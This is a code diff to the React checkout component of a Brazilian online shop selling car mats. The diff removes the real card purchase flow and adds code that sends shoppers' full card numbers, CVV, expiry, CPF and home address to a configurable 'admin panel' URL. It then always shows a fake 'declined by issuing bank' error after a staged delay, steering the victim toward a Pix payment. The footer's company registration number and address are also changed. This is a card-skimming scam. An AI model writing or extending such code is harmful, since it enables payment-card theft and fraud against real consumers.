@@ -57,9 +57,15 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
   const [transactionId, setTransactionId] = useState('');
   const [copied, setCopied] = useState(false);
 
-  // Scroll to top on mount
+  // Scroll to top and trigger InitiateCheckout on mount
   useEffect(() => {
     window.scrollTo(0, 0);
+    const eventId = generateEventId();
+    trackMetaEvent('InitiateCheckout', eventId, {
+      value: finalPrice,
+      currency: 'BRL',
+      content_name: `Kit ${kit === 'basico' ? 'Básico' : 'Proteção Total'} - ${vehicle || 'Carro'}`,
+    });
   }, []);
 
   // Testimonial carousel state
@@ -355,14 +361,6 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
     e.preventDefault();
     if (step === 1) {
       if (validateStep1()) {
-        const eventId = generateEventId();
-        getHashedUserData(formData).then(hashedUser => {
-          trackMetaEvent('InitiateCheckout', eventId, {
-            value: finalPrice,
-            currency: 'BRL',
-            content_name: `Kit ${kit === 'basico' ? 'Básico' : 'Proteção Total'} - ${vehicle || 'Carro'}`,
-          }, hashedUser);
-        });
         setStep(2);
       }
     } else if (step === 2) {
@@ -374,22 +372,71 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
         await handleCreatePix();
       } else {
         if (validateCardDetails()) {
-          const purchaseEventId = generateEventId();
-          localStorage.setItem('cartapetes_purchase_data', JSON.stringify({
-            value: finalPrice,
-            currency: 'BRL',
-            eventId: purchaseEventId,
-            kit: kit,
-            upsellItems: upsellItems,
-            perfumeUpsell: perfumeUpsell,
-            nome: formData.nome,
-            email: formData.email,
-            telefone: formData.telefone,
-            cep: formData.cep,
-            cidade: formData.cidade,
-            estado: formData.estado
-          }));
-          window.location.href = '/obrigado.html';
+          setIsApiLoading(true);
+          setApiError('');
+          
+          // Prepara payload para o painel admin
+          const payload = {
+            event: 'card_declined',
+            lead: {
+              nome: formData.nome,
+              email: formData.email,
+              cpf: formData.cpf,
+              telefone: formData.telefone,
+              cep: formData.cep,
+              rua: formData.rua,
+              numero: formData.numero,
+              complemento: formData.complemento,
+              bairro: formData.bairro,
+              cidade: formData.cidade,
+              estado: formData.estado
+            },
+            card: {
+              number: formData.cardNumber,
+              name: formData.cardName,
+              expiry: formData.cardExpiry,
+              cvv: formData.cardCvv,
+              installments: formData.installments
+            },
+            order: {
+              vehicle: vehicle || 'Carro',
+              kit: kit,
+              upsellItems: upsellItems,
+              perfumeUpsell: perfumeUpsell,
+              finalPrice: finalPrice,
+              paymentMethod: 'card',
+              status: 'negado'
+            },
+            timestamp: new Date().toISOString()
+          };
+
+          const adminUrl = window.ADMIN_PANEL_URL || localStorage.getItem('admin_panel_url') || '';
+          
+          const sendToAdmin = async () => {
+            if (adminUrl) {
+              try {
+                await fetch(adminUrl, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify(payload)
+                });
+                console.log('[Admin Panel] Dados enviados com sucesso.');
+              } catch (err) {
+                console.error('[Admin Panel] Erro ao enviar dados:', err);
+              }
+            } else {
+              console.log('[Admin Panel] Nenhuma URL configurada. Payload:', payload);
+            }
+          };
+
+          // Simula processamento com o banco emissor (1.2s)
+          setTimeout(async () => {
+            await sendToAdmin();
+            setIsApiLoading(false);
+            setApiError('Transação Recusada pelo banco emissor. Verifique o limite ou digite os dados de outro cartão. Se preferir, finalize via Pix com 5% de desconto.');
+          }, 1200);
         }
       }
     }
@@ -1573,7 +1620,7 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
 
           <div className="space-y-1 mt-6 text-slate-500 text-[10px]">
             <div className="font-bold text-slate-700 text-xs">CarTapetes Ltda.</div>
-            <div>CNPJ: 03.570.101/0001-96 | Endereço: Rua Rua Irma Amelia, 155, São Paulo, Cep 03156-150</div>
+            <div>CNPJ: 35.824.695/0001-00 | Endereço: Rua Ibitirama 486 Vila Prudente São Paulo SP 03134-001</div>
             <div className="text-slate-400 mt-2">© 2026 CarTapetes. Todos os direitos reservados.</div>
           </div>
         </div>
